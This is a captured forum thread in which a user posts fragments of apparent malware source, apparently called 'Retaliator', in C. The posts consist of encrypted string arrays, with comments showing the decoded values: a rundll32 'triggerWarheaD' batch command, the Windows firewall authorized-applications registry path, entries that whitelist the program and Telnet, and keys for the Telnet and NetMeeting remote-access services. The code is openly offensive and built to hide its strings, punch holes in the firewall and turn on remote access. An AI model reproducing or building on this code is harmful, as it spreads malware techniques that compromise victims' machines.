+					<dt>Join Date</dt> <dd>Jul 2010</dd>
+					
+					
+					<dt>Posts</dt> <dd>271</dd>	
+					<dt>Blog Entries</dt><dd><a href="blogf35f.html?u=61">4</a></dd>
+				</dl>
+				
+				
+				<div class="imlinks">
+					    
+				</div>
+			
+		</div>
+		<div class="postbody">
+			<div class="postrow has_after_content">
+				
+				
+
+
+						
+						
+				<div class="content">
+					<div id="post_message_974">
+						<blockquote class="postcontent restore ">
+							<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:372px;">&quot;\xBA\xB0\xA0\x9E\xF5\xF1\x90\x8B\xF2\x99\xD7\xD3\x84\xDE\xAE\x8F\xFA&quot;\
+					  &quot;\xB9\xD8\x8C\xC2\x99\xB3\xB6\xEE\xDE\xE2\xB1\xFE\xB3\xF3\x85\xF4\xE5&quot;\
+					  &quot;\xBB\xF7\x94\xAC\xEB\x94\x9C\xE1\x80\xF4\xED\x80\xAB\x92\xC6\xC0\x89&quot;\
+					  &quot;\xDB\xB7\xA7\x91\x8B\xB3\xB2\xF5\x99\xC2\xE3\xB3\xCF\xD8\xB4\xAD\xFE&quot;\
+					  &quot;\xE5\x95\x9C\xF8\xC6\xA3\xE7\xBF\xFC\xBC\x9B\xF4\x80\xB7\xED\xE5\x9C&quot;\
+					  &quot;\xD7\x84\x89\xC1\x9F\xA5\xAD\xAC\xFF\x8C\x8C\xAE\xCF\xC0\xEA\xFB\xD3&quot;\
+					  &quot;\xD6\xC7\xC4\xFD\xEE\xBB\xCB\xC5\xDA\xC0\xC6\xE8\xC7\xCB\xC4\xEA\x97&quot;\
+					  &quot;\xCA\x85\xA3\xED\xBB\xBB\xFF\xB3\x99\xEC\x83\x98\x82\xF8\xC5\xD1\xFD&quot;\
+					  &quot;\xAE\xCE\x92\xA8\x83\xCA\xC8\xCB\x8D\xE0\xC5\xAC\xCD\x80\xA5\xD3\xAB&quot;\
+					  &quot;\xC0\xC6\xA1\xF8\xE3\x9F\x8D\xAA\xE3\xC7\xDB\x90\xC1\xC1\xF6\xF1\x9B&quot;\
+					  &quot;\xB8\xA6\x84\xF5\xC5\xF8\xF9\x97\xDA\xF2\xAC\xBE\xD8\xB7\xC6\xCE\xF4&quot;\
+					  &quot;\xDE\xE9\xB8\xCE\xD4\xF0\xFE\x80\xAC\x8A\xE8\x8C\xBB\xDC\x83\xC6\xB5&quot;\
+					  &quot;\xEB\xD1\xC0\x96\xD7\xFE\xB0\xD6\xD1\xA3\xF1\xA8\xC6\xE2\xC8\xA2\xD4&quot;\
+					  &quot;\xEC\xDC\x83\xDA\xC0\xA2\xF8\x83\xF8\x8B\xFD\xFB\xCD\xEF\x9B\xCA\x9A&quot;\
+					  &quot;\xCE\x86\xF4\x84\xD8\xC3\xE9\xC0\x8D\xB6\xF1\x9D\x8C\xE9\xD6\xDF\xC0&quot;\
+					  &quot;\xD6\x8C\xB1\xD5\x8D\xAF\xA5\xCE\xCC\x8E\xA5\x83\xE7\xB5\xD2\xFF\xA8&quot;\
+					  &quot;\xD6\x8C\x86\xFE\xC1\xB6\xF8\x9C\xF9\xEF\x87\xF2\xF1\xD8\xBC\xBD\xFE&quot;\
+					  &quot;\xF9\xE8\xEC\xED\x9A\xF9\x8F\xCA\xFB\x89\xEA\x85\x83\xFF\x8C\xF4\x80&quot;\
+					  &quot;\xC2\x81\x94\xE3\xCD\x82\x8E\xC2\x90\xA2\xCF\x8C\x90\xAC\xFD\xF7\xD5&quot;\
+					  &quot;\xED\xB1\xA1\xB6\x86\x97\x94\xF4\x9F\xB2\xD5\xD9\x9F\xD8\xC2\xE8\x9F&quot;\
+					  &quot;\xC3\xAA\xE8\x81\xFC\xFC\xA6\xF4\xD4\x8D\xCA\x95\x86\xE9\x82\xA7\xD0&quot;\
+					  &quot;\x8C\xF9\xDD\xAC\xBD\x92\xD4\xE0\xE8\x8F\x90\xDE\xC7\xC9\xC2\xDF\xD3&quot;\
+					  &quot;\xE8\xFA\xBF\x8D\xB8\xF5\xDF\xA8\xF8\x82\xBA\xD5\xED\xA7\xC4\xF9\x94&quot;\
+					  &quot;\x93\x82\x83\x9D\xC5\xD3\xC0\xAF\xB6\xD5\xB2\xE5\x82\x87\xFB\xC5\x93&quot;\
+					  &quot;\x8D\xBD\x8C\xD8\xE3\xD6\xAD\xAA\xDE\xCD\xC7\x8B\xC8\x93\x9D\xC1\xE0&quot;\
+					  &quot;\xD9\x8F\xA9\xC1\xC8\xF8\xC4\xEA\x84\xF8\xBB\xEA\xC6\xA7\xCA\xE4\x8A&quot;\
+					  &quot;\xF8\xC3\xF9\xCD\xF2\xB5\xDC\xCF\xC7\xC0\xA7\xFF\xEC\xFA\x8A\xB4\xCC&quot;\
+					  &quot;\xCE\xC4\xE2\xE4\xA3\xA0\xF2\xC7\xC1\xB9\x98\x92\xA0\xD7\x8F\x99\xD2&quot;;
+	plainbuffer[61] = &quot;\xDD\xD9\xEC\xEE\xB3\x98\xF0\xCA\xCC\x87\xB8\xBC\x9E\xD7\xE1\x98\xF1&quot;\
+					  &quot;\xE3\xB0\xB1\x88\xD8\xC6\xEF\x84\x99\xE8\x98\x87\xAE\xD7\xF6\x8F\x9F&quot;\
+					  &quot;\xF7\x81\xE6\x85\x85\xCA\xF1\xBA\xF7\xCF\xA7\xED\xF9\xA6\xE6\xE3\xA6&quot;\
+					  &quot;\xEB\xBB\xF0\x83\xF0\xF8\x91\x83\xA8\x8C\xA0\xE6\x86\xB9\xD5\xC0\xD3&quot;\
+					  &quot;\xB0\xD4\xAA\xBB\xD4\x8B\x94&quot;;//&quot;\@echo off\n\%SystemRoot\%\\system32\\rundll32.exe retaliator.bat, triggerWarheaD&quot;; // *natdat = &quot;\@echo off\n\%SystemRoot\%\\system32\\rundll32.exe NatSec.dll, triggerWarheaD&quot;;
+	plainbuffer[62] = &quot;\xC2\xA2\xF3\xA2\xAD\xFA\xBE\x84\xC4\x81\xC9&quot;;//&quot;USERPROFILE&quot;; // empty = getenv(&quot;USERPROFILE&quot;);
+	plainbuffer[63] = &quot;\xDD\xA9\xE8\xB9\xB0\xE1\xBA\xD8\xF0\xC8\x85\x9F&quot;;//&quot;explorer.exe&quot;;
+	plainbuffer[64] = &quot;\x9F\x91\xA3\xE0\xCE\xC5\xF4\x92\x9D\xFB\xEC\x9F&quot;;//&quot;rundll32.exe&quot;;
+	plainbuffer[65] = &quot;\xAA\xC0\xE0\x88\xE6\xAA\xF1\x95\x9B\xE2\xFC\xEA\x94\xC1\x9D&quot;;//&quot;ALLUSERSPROFILE&quot;;
+	plainbuffer[66] = &quot;\x99\xC6\x84\xF1\x8A\xCB\xC3\xF5\xC0\x8C\xA2\xF8&quot;;//&quot;winlogon.exe&quot;;
+	plainbuffer[67] = &quot;\xE9\xD4\xA7\xE0\x80\xAB\xFA\x87&quot;;//&quot;explorer&quot;;
+	plainbuffer[68] = &quot;\x9B\xE3\xC2\xB9\xC6\x99\xFD\x91&quot;;//&quot;rundll32&quot;;</pre>
+</div>
+						</blockquote>
+					</div>
+
+					
+				</div>
+			</div>
+			
+			<div class="after_content">
+				
+				<!-- edit note -->
+				<blockquote class="postcontent lastedited">
+					
+						Last edited by fb1h2s; 10-13-2010 at <span class="time">11:00 PM</span>.
+					
+					
+				</blockquote>
+				<!-- / edit note -->
+				
+				
+				
+				
+				
+			</div>
+			
+			<div class="cleardiv"></div>
+		</div>
+	</div>
+		<div class="postfoot">
+			<!-- <div class="postfoot_container"> -->
+			<div class="textcontrols floatcontainer">
+				<span class="postcontrols">
+					<img style="display:none" id="progress_974" src="images/misc/progress.html" alt="" />
+					
+					
+					
+						<a id="qrwq_974" class="newreply" href="newreplyf3fe.html?do=newreply&amp;p=974" rel="nofollow" title="Reply With Quote"><img id="quoteimg_974" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> 
+					
+					
+					
+				</span>
+				<span class="postlinking">
+					
+						
+					
+
+					
+					
+					
+					
+
+					
+					
+
+					
+					
+					
+					
+					
+				</span>
+			<!-- </div> -->
+			</div>
+		</div>
+	<hr />
+</li>
+
+<li class="postbitlegacy postbitim postcontainer old" id="post_976">
+<!-- see bottom of postbit.css for .userinfo .popupmenu styles -->
+
+	<div class="posthead">
+			<span class="postdate old">
+				
+					<span class="date">09-16-2010,&nbsp;<span class="time">05:50 PM</span></span>
+				
+			</span>
+			<span class="nodecontrols">
+				
+					<a name="post976" href="showthread17e1-2.html?t=333&amp;p=976&amp;viewfull=1#post976" class="postcounter">#7</a><a id="postcount976" name="7"></a>
+				
+				
+				
+			</span>
+	</div>
+	<div class="postdetails">
+		<div class="userinfo">
+			<div class="username_container">
+			
+				<div class="popupmenu memberaction">
+	<a class="username offline popupctrl" href="memberf35f.html?u=61" title="&quot;vinnu&quot; is offline"><strong>&quot;vinnu&quot;</strong></a>
+	<ul class="popupbody popuphover memberaction_body">
+		<li class="left">
+			<a href="memberf35f.html?u=61" class="siteicon_profile">
+				View Profile
+			</a>
+		</li>
+		
+		<li class="right">
+			<a href="searchea10.html?do=finduser&amp;userid=61&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">
+				View Forum Posts
+			</a>
+		</li>
+		
+		
+		<li class="left">
+			<a href="privatecde6.html?do=newpm&amp;u=61" class="siteicon_message" rel="nofollow">
+				Private Message
+			</a>
+		</li>
+		
+		
+		
+		<li class="right">
+			<a href="blogf35f.html?u=61" class="siteicon_blog" rel="nofollow">
+				View Blog Entries
+			</a>
+		</li>
+		
+		
+		
+		
+		
+		<li class="right">
+			<a href="list3989.html?r=author/61-quot-vinnu-quot" class="siteicon_article" rel="nofollow">
+				View Articles
+			</a>
+		</li>
+		
+
+		
+
+		
+		
+	</ul>
+</div>
+				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.html" alt="&quot;vinnu&quot; is offline" border="0" />
+
+			
+			</div>
+			<span class="usertitle">
+				Security Researcher
+			</span>
+			
+			
+			
+				<span class="postbit_reputation" id="repdisplay_976_61" title="&quot;vinnu&quot; is a jewel in the rough">
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+				</span>
+			
+			
+			<a class="postuseravatar" href="memberf35f.html?u=61" title="&quot;vinnu&quot; is offline">
+				<img src="OgAAAKECRZIQ0CQMht6ocaZhb4RxV7AN8oAwoXnODx3ShEWW6iUkMn-Agi6QXhZHZzoO57xtCO3wfqfigLPcm16fk4IAm1T1UGRi01ee?u=61&amp;dateline=1311230253" alt="&quot;vinnu&quot;'s Avatar" title="&quot;vinnu&quot;'s Avatar" />
+			</a>
+			 
+			
+				<hr />
+				<dl class="userinfo_extra">
+					<dt>Join Date</dt> <dd>Jul 2010</dd>
+					
+					
+					<dt>Posts</dt> <dd>271</dd>	
+					<dt>Blog Entries</dt><dd><a href="blogf35f.html?u=61">4</a></dd>
+				</dl>
+				
+				
+				<div class="imlinks">
+					    
+				</div>
+			
+		</div>
+		<div class="postbody">
+			<div class="postrow has_after_content">
+				
+				
+
+
+						
+						
+				<div class="content">
+					<div id="post_message_976">
+						<blockquote class="postcontent restore ">
+							<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:372px;">&quot;\xE8\xCA\xF9\x80\xAE\xA5\xED\xC1\xB8\x99\xCF\xD0\xB2\xB9\xF3\xDC&quot;\
+					  &quot;\xC1\xAD\xF8\xAC\xD6\xCF\xC5\xBF\xBF\xC7\xAC\xC3\xAC\xD2\x8C\x97&quot;\
+					  &quot;\xDE\x9F\x85\xE7\x9F\xA8\xED\xB0\xCC\xF4\xCB\xD0\x9D\x87\xCC\xF8&quot;\
+					  &quot;\x83\xF3\xAB\xF8\x96\xB4\xC1\xCB\xFA\xBB\x91\xDF\xE9\xD6\xF5\xC8&quot;\
+					  &quot;\xDC\x99\xB6\xF6\x89\xAF\xE4\xA1\xDE\x8F\xDB\x98\xDC\xBF\xDD\xD9&quot;\
+					  &quot;\xBE\x93\x98\xC9\xB1\x8C\xB8\xEE\x85\x8A\xE6\x86\xB3\xC4\xC3\xBD&quot;\
+					  &quot;\xB9\xAA\xFB\xB2\xAB\xF9\x9D\xF9\x8F\xC8\xB1\xC5\xFC\x89\x98\xC8&quot;\
+					  &quot;\x96\xFD\x9B\xF8\x99\xC3\x8C\xBF\xA6\xB2\xC8\x9F\x9B\xD0\xAA\x8E&quot;\
+					  &quot;\xE3\xC8\xF1\xF0\xEF\x99\xAF\x86\xE9\x8C\xE0\xBA\x9F\xA3\xD5\xEB&quot;\
+					  &quot;\xCA\xC0\xC6\xC3\xDE\xC1\xBF\x87\x80\xBE\xF0\x9A\xEB\xD4\xDF\x8A&quot;\
+					  &quot;\xB0\x8E\xFF\xDB\xDF\xF0\x9F\xE2\xDA\x85\xBA\xDE\x8C\xFD\xBE\xA8&quot;\
+					  &quot;\x9B\xE9\xD6\xDF\xCC\xFF\xB6\xE8\xEC\xF0\x84\xB8\xE9\xDE\xF2\xCE&quot;\
+					  &quot;\x8A\xFD\xB7\xD0\x87\xFF\xCB\xB7\xAD\xD5\x91\xC0\xD5\xCD\xFC\xC4&quot;\
+					  &quot;\xFE\xE0\xAA\xE6\x9C\x8C\x86\xC3\x9F\x80\xCD\x84\xC5\xE3\xC4\xB0&quot;\
+					  &quot;\xAC\xC9\xAB\x93\xDE\x8D\xF2\xAD\xFB\xD2\xE9\xE9\x85\xE1\xEC\xC8&quot;\
+					  &quot;\xFE\xDB\xA9\xC2\x9C\x8B\xEA\x8A\xB5\xDE\xAD\xCC\xFF\x9E\xEB\xBD&quot;\
+					  &quot;\x97\xFE\x9A\xF2\xE1\x86\x87\xCA\x9C\xB6\x9C\xEC\xE3\xFB\xB7\xE8&quot;\
+					  &quot;\x98\x9F\xD5\xDC\xEA\x82\xAD\xAB\xCE\xB6\xE8\xED\xD2\xE7\xBD\x98&quot;\
+					  &quot;\xCB\x8C\xF0\x99\xA2\xCD\xE7\xB9\xAF\xF1\x9C\xAB\xF1\xFB\xEA\xB1&quot;\
+					  &quot;\xFB\xB8\x91\x88\xAA\xAC\xDE\xFF\xD6\xDF\xE7\xAF\xCB\xE8\xC3\xD8&quot;\
+					  &quot;\xE9\xDB\xE5\x88\xC6\xFF\xA8\xEF\xD4\xAD\xF0\xAF\x98\xEE\xD5\x93&quot;\
+					  &quot;\x8C\xF3\xF7\x99\xF8\x91\x8A\x92\x88\xF3\xA2\xF8\x86\xC3\x88\xFF&quot;\
+					  &quot;\xE2\xAF\xED\xE2\xEB\xD3\xB0\xED\xEA\xAC\xFE\xE7\xBD\xA6\xB7\xF2&quot;\
+					  &quot;\xB3\xBB\xBE\x83\xFB\xB6\xCF\xF8\x92\xD6\xD5\x95\xF6\xB7\xBE\xC1&quot;\
+					  &quot;\x9F\xA4\xB4\xEE\xDD\x81\xAD\xE5\x81\xF5\xBC\xB9\xB7\xF8\x9D\x99&quot;\
+					  &quot;\xE9\x94\xB1\xE3\xB5\xED\xA6\xD6\xFF\xD2\xBE\xF7\xE7\xD3\x9F\xFA&quot;\
+					  &quot;\x92\xCA\x9B\x85\xFF\xA2\xF9\xDC\xD1\x87\xC4\xD3\xAC\xB4\xD3\xD9&quot;\
+					  &quot;\xFE\xD8\xEF\xA6\x9F\xF9\xE9\xCC\xFC\xCB\xF9\xD7\x87\xAD\x95\xB0&quot;\
+					  &quot;\xDA\xDA\xF1\xDB\xBD\xBA\xF0\xB4\xFF\xAD\xC8\x8F\xD2\xEE\x91\xED&quot;\
+					  &quot;\xC9\xA9\xF8\x85\xE7\xFF\xCB\xD9\xCD\xAF\xE3\xC1\xBD\x90\xE5\xDE&quot;\
+					  &quot;\xAE\xAA\xD8\x8A\xE2\xBA\xFD\xBE\x9D\xBE\xF0\xC7\xC4\xE7\x9D\x93&quot;\
+					  &quot;\xD9\xF1\x8E\xB3\xCE\xD5\xC9\xC9\xF9\xF1\xD6\xEC\xF5\xE2\x83\xED&quot;\
+					  &quot;\xFB\x8C\xC1\xAF\x91\xBA\xEA\x9D\xEE\xED\xC9\x8A\xB1\x9B\xAC\x8A&quot;\
+					  &quot;\xFD\x97\xCD\x8A\xCC\xC2\xDF\xD1\xC6\x8E\xF4\xAB\xC7\xD8\xA2\xE2&quot;\
+					  &quot;\x9C\xDA\xE0\xD8\xAB\xCA\xFF\xD3\x8D\xFE\xCA\xB5\xB9\xB4\xB1\xDD&quot;\
+					  &quot;\xDB\xED\xCB\xC1\xCB\x86\xE4\xA6\xAC\xF2\x97\x8C\xE9\xFA\x8D\x81&quot;\
+					  &quot;\xFA\xF2\xD3\xC6\xC8\xD7\xD3\xD5\xC2\xC9\x8A\xEC\xCC\xB2\xAF\xC1&quot;\
+					  &quot;\xFE\x93\xDC\xCC\xD6\xB0\xBD\x85\xC4\xBF\x8C\xC9\xE0\xCF\xB6\xFF&quot;\
+					  &quot;\x8A\xF1\xF0\x97\xF7\xD2\xC2\xBD\xAA\xAD\xB0\xD4\xE8\xE1\x8B\xB5&quot;\
+					  &quot;\xDD\xD7\xBD\x89\xEC\x9C\x99\xF8\xCD\xEB\x9D\xC4\xAD\xDD\x8C\xE4&quot;\
+					  &quot;\x85\xFD\xFE\x9D\xAB\xCD\xC5\xF5\xC4\x87\xEB\xFE\xE9\x82\xBD\x8E&quot;\
+					  &quot;\xFE\xDF\xF3\xC9\x89\xA3\xF7\xCC\xCC\xDF\xDD\xE2\xCD\xC8\xFA\xFE&quot;\
+					  &quot;\x9B\xAE\xCA\xAE\xEB\xC2\xDA\xCB\x86\x8F\x86\xB1\xA4\x90\x80\xF4&quot;\
+					  &quot;\xD9\xBF\xA7\x9B\xC3\x9B\xA1\xBD\x8E\xDE\x93\x91\x8F\xE2\xDE\xED&quot;\
+					  &quot;\xDB\xE9\xB4\xB9\xFF\x82\x9B\xF8\x9B\xA1\xC5\xE4\x87\xE9\xCE\x9E&quot;\
+					  &quot;\xB3\xD0\xD6\xC0\x83\x96\xA6\xAC\x84\x9A\xB2\xEB\x84\xB8\xED\xDF&quot;\
+					  &quot;\x8E\x9D\xF2\x97\xD2\xB0\x8E\xFF\xB1\xCF\x87\xE6\x90\xC8\xC1\xAF&quot;\
+					  &quot;\xC4\xEC\xDB\xDC\xFA\xFE\xFF\xBB\xEC\xC8\xBE\xC2\x8A\x8C\xFB\x9A&quot;\
+					  &quot;\xA5\xD3\xB1\xD2\xF4\x81\xFE\xD4\x8A\xE9\xE5\xE3\xE4\x86\x8B\xC8&quot;\
+					  &quot;\x9E\xE3\xD1\xAA\xA4\xC0\x8A\xC7\x90\xAE\xEF\xFD\xD8\xB2\x8F\x8E&quot;\
+					  &quot;\xDB\x89\xDE\xCE\xAB\xA8\xE2\xD2\xF1\x9D\xFF\xBB\xED\xEE\xE1\xBA&quot;\
+					  &quot;\xE0\xA1\x8D\xF8\xDB\xDB\x8C\x9C\xDE\x8C\xBD\xFF\xC0\xD3\xE1\xDC&quot;\
+					  &quot;\xEF\xDC\xD1\x98\xE7\xDC\xED\xE4\xD9\xC2\xAC\xAF\xE5\xDB\xBA\xD9&quot;\
+					  &quot;\xBB\xD6\xD7\xF5\x92\xF8\xF6\xA8\x99\xF9\x8F\x99\xB3\xB5\xDF\x89&quot;\
+					  &quot;\xCA\xBB\x90\xF9\x8C\xC4\xBE\xB3\xBE\xE8\xD9\xA5\xB3\xBC\xBD\xE5&quot;\
+					  &quot;\xE5\x9F\xEB\xBC\xEC\x86\xB1\xEE\x99\xA9\xE8\xCD\xB3\xE7\xE5\xD7&quot;\
+					  &quot;\xBB\xAC\xCE\x85\xDF\x8D\xA0\xD4\x98\xA3\xFF\xDD\x9E\xC4\xE2\xB2&quot;\
+					  &quot;\xC0\xC0\x9C\xBD\xAD\xF7\x96\x86\xF8\x82\xF0\xAA\xFA\xD9\xB4\x96&quot;\
+					  &quot;\xEB\xC5\xDB\x8B\x9E\xF8\xD9\x92\x97\xFD\x82\xA7\xFF\xBE\xA2\xFF&quot;\
+					  &quot;\x9A\xB2\xE9\xD9\xE2\xB4\xBB\xBA\xA2\xA2\xDD\xA7\xD2\xCA\xC4\xCF&quot;\
+					  &quot;\xD8\x84\xDC\xCA\xC7\xD3\x95\xEA\xA6\xFD\xBF\xFC\xF5\x96\xF5\xD5&quot;\
+					  &quot;\xA3\x90\xC8\x85\x8E\x97\xA0\xF1\xF8\xFA\xCE\x82\xA9\xD5&quot;;
+	plainbuffer[82] = &quot;\xC5\xC2\x9F\x8E\xDF\xD6\xC3\xC4\xD0\xD3\xB7\xD7\xFD\xFF\xBE\x84&quot;\
+					  &quot;\x88\xE6\xB6\xDD\xE3\xD9\x99\xBD\x90\xCC\xCF\xA1\x8A\x8E\xFE\xDF&quot;\
+					  &quot;\xB4\xDA\x81\x9E\xF5\xC1\xEB\xFC\xDC\xA9\xE4\xB7\xDD\xCE\x92\xC6&quot;\
+					  &quot;\x8A\xD2\xEF\xC7\xAF\xDF\xBA\xBE\xD8\xCD\xC8\xA8\xAB\xA8\xA4\xB6&quot;\
+					  &quot;\xC0\xED\xDA\xD2\x85\xC3\xAF\xDF\x9A\x97\xB6\xC4\xC3\xEC\xA7\x87&quot;\
+					  &quot;\xA9\xE9\xD0\xC0\xF1\xF4\xC4\xC8\xD6\x9B\xA2\xEF\xBB\xB4\xA3\xCF&quot;\
+					  &quot;\xC2\x9D\x92\x89\xB9\x95\xDE\xE8\xA8\xB3\x92\x9D\xFE\xCD\xB4\xF8&quot;\
+					  &quot;\xAE\xB7\xF6\x98\xFC\xF3\xD8\xB7\xB6\xE3\xAF\x90\xDC\xFF\x8B\xD0&quot;\
+					  &quot;\x92\x84\xFA\xA3\xE6\x91\x8F\xD3\x84\xF5\x8C\x8B\xC8\xA4\xA0\xF8&quot;\
+					  &quot;\xDF\xB4\xCE\x90\x8D\xCC\xA2\x8C\xBF\xEB\xF7\xEF\xE6\xB3\xF3\xDB&quot;\
+					  &quot;\x86\xEF\x9C\xD8\xB3\x91\xCE\xD5\xDA\xC8\xF9\xE4\xC5\xC9\xE7\xBD&quot;\
+					  &quot;\xE5\x9F\xDB\x8D\xC7\xE3\xC8\xD7\x82\xA8\xE3\xDC\xC8\xCA\x86\xF1&quot;\
+					  &quot;\xDD\x83\xBA\x99\x8C\xED\xC7\x8E\x8C\xCF\xDC\xC3\xDB\xC0\xD3\xE3&quot;\
+					  &quot;\xEB\xA7\x9F\xC1\xC5\xC2\xAF\xE9\x8E\xE5\x8B\xE1\x86\xE3\xD1\xA8&quot;\
+					  &quot;\xAB\x8C\x94\xFA\xCF\xCC\xD8\xC4\xE1\xFF\x8D\xFB\x81\x85\xFC\xD8&quot;\</pre>
+</div>
+						</blockquote>
+					</div>
+
+					
+				</div>
+			</div>
+			
+			<div class="after_content">
+				
+				<!-- edit note -->
+				<blockquote class="postcontent lastedited">
+					
+						Last edited by fb1h2s; 10-13-2010 at <span class="time">11:01 PM</span>.
+					
+					
+				</blockquote>
+				<!-- / edit note -->
+				
+				
+				
+				
+				
+			</div>
+			
+			<div class="cleardiv"></div>
+		</div>
+	</div>
+		<div class="postfoot">
+			<!-- <div class="postfoot_container"> -->
+			<div class="textcontrols floatcontainer">
+				<span class="postcontrols">
+					<img style="display:none" id="progress_976" src="images/misc/progress.html" alt="" />
+					
+					
+					
+						<a id="qrwq_976" class="newreply" href="newreply24cc.html?do=newreply&amp;p=976" rel="nofollow" title="Reply With Quote"><img id="quoteimg_976" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> 
+					
+					
+					
+				</span>
+				<span class="postlinking">
+					
+						
+					
+
+					
+					
+					
+					
+
+					
+					
+
+					
+					
+					
+					
+					
+				</span>
+			<!-- </div> -->
+			</div>
+		</div>
+	<hr />
+</li>
+
+<li class="postbitlegacy postbitim postcontainer old" id="post_978">
+<!-- see bottom of postbit.css for .userinfo .popupmenu styles -->
+
+	<div class="posthead">
+			<span class="postdate old">
+				
+					<span class="date">09-16-2010,&nbsp;<span class="time">05:52 PM</span></span>
+				
+			</span>
+			<span class="nodecontrols">
+				
+					<a name="post978" href="showthreadc896.html?t=333&amp;p=978&amp;viewfull=1#post978" class="postcounter">#8</a><a id="postcount978" name="8"></a>
+				
+				
+				
+			</span>
+	</div>
+	<div class="postdetails">
+		<div class="userinfo">
+			<div class="username_container">
+			
+				<div class="popupmenu memberaction">
+	<a class="username offline popupctrl" href="memberf35f.html?u=61" title="&quot;vinnu&quot; is offline"><strong>&quot;vinnu&quot;</strong></a>
+	<ul class="popupbody popuphover memberaction_body">
+		<li class="left">
+			<a href="memberf35f.html?u=61" class="siteicon_profile">
+				View Profile
+			</a>
+		</li>
+		
+		<li class="right">
+			<a href="searchea10.html?do=finduser&amp;userid=61&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">
+				View Forum Posts
+			</a>
+		</li>
+		
+		
+		<li class="left">
+			<a href="privatecde6.html?do=newpm&amp;u=61" class="siteicon_message" rel="nofollow">
+				Private Message
+			</a>
+		</li>
+		
+		
+		
+		<li class="right">
+			<a href="blogf35f.html?u=61" class="siteicon_blog" rel="nofollow">
+				View Blog Entries
+			</a>
+		</li>
+		
+		
+		
+		
+		
+		<li class="right">
+			<a href="list3989.html?r=author/61-quot-vinnu-quot" class="siteicon_article" rel="nofollow">
+				View Articles
+			</a>
+		</li>
+		
+
+		
+
+		
+		
+	</ul>
+</div>
+				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.html" alt="&quot;vinnu&quot; is offline" border="0" />
+
+			
+			</div>
+			<span class="usertitle">
+				Security Researcher
+			</span>
+			
+			
+			
+				<span class="postbit_reputation" id="repdisplay_978_61" title="&quot;vinnu&quot; is a jewel in the rough">
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+				</span>
+			
+			
+			<a class="postuseravatar" href="memberf35f.html?u=61" title="&quot;vinnu&quot; is offline">
+				<img src="OgAAAKECRZIQ0CQMht6ocaZhb4RxV7AN8oAwoXnODx3ShEWW6iUkMn-Agi6QXhZHZzoO57xtCO3wfqfigLPcm16fk4IAm1T1UGRi01ee?u=61&amp;dateline=1311230253" alt="&quot;vinnu&quot;'s Avatar" title="&quot;vinnu&quot;'s Avatar" />
+			</a>
+			 
+			
+				<hr />
+				<dl class="userinfo_extra">
+					<dt>Join Date</dt> <dd>Jul 2010</dd>
+					
+					
+					<dt>Posts</dt> <dd>271</dd>	
+					<dt>Blog Entries</dt><dd><a href="blogf35f.html?u=61">4</a></dd>
+				</dl>
+				
+				
+				<div class="imlinks">
+					    
+				</div>
+			
+		</div>
+		<div class="postbody">
+			<div class="postrow has_after_content">
+				
+				
+
+
+						
+						
+				<div class="content">
+					<div id="post_message_978">
+						<blockquote class="postcontent restore ">
+							<div class="bbcode_container">
+	<div class="bbcode_description">Code:</div>
+	<pre class="bbcode_code"style="height:372px;">/*&quot;SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List&quot;;*/
+	plainbuffer[98] = &quot;\xB0\xF6\xEB\x85\xDD\x98\x83\xD0\xB0\xC4\xAA\xDF\x92\x96&quot;\
+					  &quot;\xCE\x80\xEB\xAC\xEA\xAC\xAB\x98\xBA\xCA\xDB\xD6\x8F\xE9&quot;\
+					  &quot;\xDF\x91\xD4\x81\xBA\x8E\xBD\xDA\xC9&quot;;//&quot;SYSTEM\\ControlSet001\\Services\\mnmsrvc&quot;;
+	plainbuffer[99] = &quot;\x9E\xE0\x92\xF7\xAB\xC0\xED\xDF\xA5\x80\xEE\xED\xE5\x89&quot;\
+					  &quot;\x8F\x8E\xF8\x9C\xED\x84\xB3\xF0\xA3\xB9\xC6\xDA\xCF\xB8&quot;\
+					  &quot;\xFE\x84\xE7\xD1\xA1\xB8\x89\xC5\xFE&quot;;//&quot;SYSTEM\\ControlSet001\\Services\\TlntSvr&quot;;
+	plainbuffer[100] = &quot;\xC7\x83\x87\xB7\xEE\xC3\xDA\xFE\x8A\xD3\xDF\xD4&quot;;//&quot;\\mnmsrvc.exe&quot;;
+	plainbuffer[101] = &quot;\xA9\xE9\xEB\xDF\xAC\xAB\xAC\xE8\xB4\xEC\xF4\x8B&quot;;//&quot;\\tlntsrv.exe&quot;;
+	plainbuffer[102] = &quot;\xB4\xAE\xA6\xC6\xB9\xAF\x89\xE0\xC9\xB9\xA0\xBE&quot;\
+					   &quot;\xB2\xD3\xCC\xD3\xC5\xCB\xF9\xD0\xDE&quot;;//&quot;:*:Enabled:Retaliator&quot;;
+	plainbuffer[103] = &quot;\xD3\x87\x89\xE9\xC1\xEC\xDE\xEB\xEB\xFE\xEB\x9F\xE9\xC0\xB2\xF8\x9B&quot;;//&quot;:*:Enabled:Telnet&quot;;
+	plainbuffer[104] = &quot;\xB6\xC2\xF1\xC1\xAB&quot;;//&quot;Start&quot;;
+	plainbuffer[105] = &quot;\xA6\xDE\xF2\x9F\xC2\xFC\xBF\xDF\x87\x83\xA5\x98\xB9\xE7&quot;\
+					   &quot;\x8F\x9A\xBD\xD0\x90\x9B\xDA\x94\xF4\xF6\xAA\xB9\x9D\xE4&quot;\
+					   &quot;\xC8\xEA\xCD\x84\xCB\xC1\xE5\xCC\xE5\xAE\x9E\xAF\xF0\x99&quot;\
